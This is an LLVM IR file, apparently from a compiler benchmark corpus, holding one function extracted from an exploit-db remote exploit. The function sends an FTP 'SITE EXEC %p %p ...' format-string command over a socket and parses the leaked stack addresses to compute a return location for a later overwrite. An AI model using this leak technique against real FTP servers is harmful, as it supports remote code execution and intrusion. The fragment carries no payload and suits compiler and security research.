; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86/remote/extr_269.c_retloc_find.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86/remote/extr_269.c_retloc_find.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [11 x i8] c"SITE EXEC \00", align 1
@.str.1 = private unnamed_addr constant [4 x i8] c"%p \00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@sock = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [3 x i8] c"%p\00", align 1
@retloc = common dso_local global i32 0, align 4
@tmpaddr = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @retloc_find() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [1024 x i8], align 16
  %3 = alloca [1024 x i8], align 16
  %4 = alloca i8*, align 8
  %5 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %6 = call i32 @strcpy(i8* %5, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %7

7:                                                ; preds = %13, %0
  %8 = load i32, i32* %1, align 4
  %9 = icmp slt i32 %8, 6
  br i1 %9, label %10, label %16

10:                                               ; preds = %7
  %11 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %12 = call i32 @strcat(i8* %11, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0))
  br label %13

13:                                               ; preds = %10
  %14 = load i32, i32* %1, align 4
  %15 = add nsw i32 %14, 1
  store i32 %15, i32* %1, align 4
  br label %7

16:                                               ; preds = %7
  %17 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %18 = call i32 @strcat(i8* %17, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %19 = load i32, i32* @sock, align 4
  %20 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %21 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3, i64 0, i64 0
  %22 = call i32 @strlen(i8* %21)
  %23 = call i32 @send(i32 %19, i8* %20, i32 %22, i32 0)
  %24 = load i32, i32* @sock, align 4
  %25 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %26 = call i32 @recv(i32 %24, i8* %25, i32 1024, i32 0)
  %27 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  store i8* %27, i8** %4, align 8
  store i32 0, i32* %1, align 4
  br label %28

28:                                               ; preds = %43, %16
  %29 = load i32, i32* %1, align 4
  %30 = icmp slt i32 %29, 5
  br i1 %30, label %31, label %46

31:                                               ; preds = %28
  br label %32

32:                                               ; preds = %37, %31
  %33 = load i8*, i8** %4, align 8
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp ne i32 %35, 32
  br i1 %36, label %37, label %40

37:                                               ; preds = %32
  %38 = load i8*, i8** %4, align 8
  %39 = getelementptr inbounds i8, i8* %38, i32 1
  store i8* %39, i8** %4, align 8
  br label %32

40:                                               ; preds = %32
  %41 = load i8*, i8** %4, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %4, align 8
  br label %43

43:                                               ; preds = %40
  %44 = load i32, i32* %1, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %1, align 4
  br label %28

46:                                               ; preds = %28
  %47 = load i8*, i8** %4, align 8
  %48 = load i8*, i8** %4, align 8
  %49 = call i32 @strlen(i8* %48)
  %50 = sub nsw i32 %49, 2
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i8, i8* %47, i64 %51
  store i8 0, i8* %52, align 1
  %53 = load i8*, i8** %4, align 8
  %54 = load i8*, i8** %4, align 8
  %55 = call i32 @strlen(i8* %54)
  %56 = sub nsw i32 %55, 1
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 0, i8* %58, align 1
  %59 = load i8*, i8** %4, align 8
  %60 = call i32 @sscanf(i8* %59, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* @retloc)
  %61 = load i8*, i8** %4, align 8
  %62 = call i32 @sscanf(i8* %61, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* @tmpaddr)
  %63 = load i32, i32* @retloc, align 4
  %64 = sub nsw i32 %63, 64
  store i32 %64, i32* @retloc, align 4
  ret void
}

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @sscanf(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
